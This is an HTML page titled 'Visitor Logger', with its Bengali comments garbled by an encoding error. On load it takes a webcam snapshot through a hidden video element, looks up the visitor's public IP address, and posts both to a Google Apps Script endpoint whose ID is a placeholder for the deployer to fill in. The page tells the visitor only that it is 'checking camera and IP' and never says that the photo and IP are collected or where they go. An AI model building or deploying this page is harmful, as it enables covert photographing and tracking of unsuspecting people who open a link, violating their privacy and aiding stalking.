<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Visitor Logger</title>
</head>
<body>
  <h2>Checking camera and IP...</h2>
  <video id="video" width="300" autoplay style="display: none;"></video>

  <script>
    const webAppUrl = "https://script.google.com/macros/s/YOUR_WEB_APP_ID/exec"; // üëâ ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ Web App URL ‡¶¨‡¶∏‡¶æ‡¶®

    // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡ßá ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡ßá
    async function captureImage() {
      const video = document.getElementById('video');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      await new Promise((resolve) => setTimeout(resolve, 2000)); // ‡ß® ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶∏‡¶Æ‡ßü ‡¶®‡ßá‡ßü

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const imageUrl = canvas.toDataURL('image/png');

      stream.getTracks().forEach((track) => track.stop());

      return imageUrl;
    }

    // IP ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡ßç‡¶∞‡ßá‡¶∏ ‡¶´‡ßá‡¶ö ‡¶ï‡¶∞‡ßá
    async function getIP() {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    }

    // Google Sheet ‡¶è ‡¶™‡¶æ‡¶†‡¶æ‡ßü
    async function sendToSheet(ip, imageUrl) {
      const formData = new FormData();
      formData.append("ip", ip);
      formData.append("imageUrl", imageUrl);

      await fetch(webAppUrl, {
        method: "POST",
        body: formData
      });
    }

    // ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßá
    async function init() {
      try {
        const [ip, imageUrl] = await Promise.all([getIP(), captureImage()]);
        await sendToSheet(ip, imageUrl);
        document.body.innerHTML = "<h3>‚úÖ Successfully Logged!</h3>";
      } catch (err) {
        document.body.innerHTML = "<h3>‚ùå Error occurred: " + err.message + "</h3>";
        console.error(err);
      }
    }

    init();
  </script>
</body>
</html>
